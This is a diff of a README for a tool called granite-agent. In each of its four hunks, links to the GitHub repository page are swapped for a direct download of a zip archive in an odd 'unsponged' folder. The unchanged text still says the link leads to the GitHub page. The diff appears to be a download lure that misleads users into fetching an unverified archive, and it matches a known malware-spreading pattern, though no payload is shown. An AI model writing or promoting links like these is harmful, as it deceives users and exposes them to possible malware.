@@ -1,6 +1,6 @@
 # 🪨 granite-agent - Simple agent for smart tasks
 
-[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent)
+[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You do not need any special software or programming tools to use granite-agent. 
 To get granite-agent, you will visit the official page on GitHub. Follow these steps:
 
 1. Click the big blue button below:  
-   [Download granite-agent](https://github.com/Diana00-cybee/granite-agent)
+   [Download granite-agent](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)
 
 2. This link takes you to the granite-agent GitHub page.
 
@@ -116,7 +116,7 @@ You do not need to remember all commands right away. Use `help` to see what you 
 
 Detailed guides and updates are available on the GitHub repository:
 
-[Download and learn more about granite-agent](https://github.com/Diana00-cybee/granite-agent)
+[Download and learn more about granite-agent](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)
 
 You can also find help with issues or questions there.
 
@@ -128,4 +128,4 @@ Delete the old installer files to save disk space. Your settings will not be aff
 
 ---
 
-[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent)
+[![Download granite-agent](https://img.shields.io/badge/Download-granite--agent-blue?style=for-the-badge)](https://github.com/Diana00-cybee/granite-agent/raw/refs/heads/main/unsponged/agent_granite_v1.2.zip)
